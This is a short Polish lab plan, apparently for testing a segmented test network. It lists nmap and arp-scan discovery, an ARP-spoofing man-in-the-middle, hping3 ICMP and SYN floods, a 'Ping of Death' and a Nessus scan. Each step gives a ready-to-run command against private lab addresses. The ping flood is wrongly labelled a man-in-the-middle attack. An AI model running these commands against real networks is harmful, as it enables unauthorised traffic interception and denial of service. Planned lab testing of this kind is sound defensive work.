
# Scenariusze i walidacje

## 1. Wykrycie urządzeń sieciowych
- Narzędzie: `nmap`, `arp-scan`
- Cel: Identyfikacja hostów w VLAN USERS i ADM.
- Komenda przykładowa:
  ```bash
  nmap -sn 192.168.20.0/24
  arp-scan --interface=eth0 192.168.20.0/24
---

## 2. Wykrycie uruchomionych usług sieciowych
- Narzędzie: nmap
- Cel: Wykrycie usług na serwerach DMZ.
- Komenda:
	```bash
	nmap -sV 192.168.40.10
---

## 3. Atak man-in-the-middle – ARP spoofing
- Narzędzie: arpspoof, ettercap
- Cel: Przechwycenie ruchu między hostem a bramą.
- Komenda:
	```bash
	arpspoof -i eth0 -t 192.168.20.10 192.168.20.254`
---

## 4. Atak man-in-the-middle – Ping flood
- Narzędzie: hping3
- Cel: Zalanie hosta pakietami ICMP.
- Komenda:
	``` bash
	hping3 --icmp --flood 192.168.20.10
---

## 5. Atak odmowy usługi (DoS) – TCP SYN Flood

- Narzędzie: hping3
- Cel: Wywołanie przeciążenia serwera.
- Komenda:
	```bash
	hping3 -S --flood -p 80 192.168.40.10
---

## 6. Atak typu „Ping of Death”
- Narzędzie: ping
- Cel: Wysyłanie nadmiarowych pakietów ICMP.
- Komenda:
  ``` bash
  ping -s 65500 192.168.20.10
---
## 7. Wykrywanie podatności serwera przy użyciu Nessus
- Narzędzie: Nessus
- Cel: Skanowanie podatności serwera DMZ.
- Kroki:
	- Uruchom Nessus w Kali.
	- Dodaj cel: 192.168.40.10.
	- Wykonaj pełny skan podatności.



